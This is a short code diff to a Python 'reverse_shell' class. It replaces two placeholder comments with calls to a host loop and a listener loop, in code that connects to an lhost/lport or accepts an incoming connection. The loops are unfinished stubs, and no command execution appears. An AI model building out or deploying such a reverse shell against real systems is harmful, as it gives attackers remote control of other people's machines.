@@ -48,7 +48,7 @@ class reverse_shell:
         self.socket.connect((self.parser.lhost, self.parser.lport))
         self.verbose(
             f'[+] Socket connected to {self.parser.lhost}:{self.parser.lport}')
-        # send to new function to run recv loop
+        self.host_loop()
 
     def listener(self):
         """Runs main loop for listener, listens for beacons from host
@@ -59,7 +59,7 @@ class reverse_shell:
         self.verbose('[+] Server socket bound to port', self.parser.lport)
         c, addr = self.socket.accept()
         self.verbose('[+] Accepted incoming connection from', addr)
-        # send to function to run conversational loop
+        self.listener_loop()
 
     def listener_loop(self):
         pass
